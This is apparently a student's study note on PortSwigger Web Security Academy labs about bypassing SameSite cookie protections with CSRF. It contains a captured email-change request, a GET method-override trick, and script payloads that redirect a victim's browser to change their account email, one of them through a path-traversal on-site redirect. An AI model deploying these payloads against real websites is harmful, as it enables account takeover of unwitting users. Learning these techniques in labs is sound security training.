
[...back](../note-1.md)

# 1 endpoint

```http
#request
POST /my-account/change-email HTTP/2
Host: 0ab900440401cb4d8084769d002a0057.web-security-academy.net
Cookie: session=H7NvAR0pKYRVaeeRJSshbxuAFJGDeLVw
Content-Length: 11
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="141", "Not?A_Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://0ab900440401cb4d8084769d002a0057.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab900440401cb4d8084769d002a0057.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=a%40b

---

#response
HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

> POST request without SameSite >>> assume SameSite = Lax
> `<form action="https://vulnerable-website.com/email/change" method="POST">` <<< won't work

---

# 2 Lax bypass

try `GET` >>> endpoint accepts this method

`GET /my-account/change-email?email=a%40b&_method=POST`

---

# 3 lax bypass csrf

```html
<html>
  <body>
<script>
    document.location = "https://0ab900440401cb4d8084769d002a0057.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
  </body>
</html>
```

---

# 4 strict bypass

```
>>> identify exploit endpoint e.g.
	GET /my-account/change-email?...
	
>>> identify on-site injectable redirect
	GET /post/comment/confirmation?postId=injectable/../../my-acccount/change-email?...
	
>>> payload
	`<script> document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1"; </script>`
```

---

# end

[...back](../note-1.md)
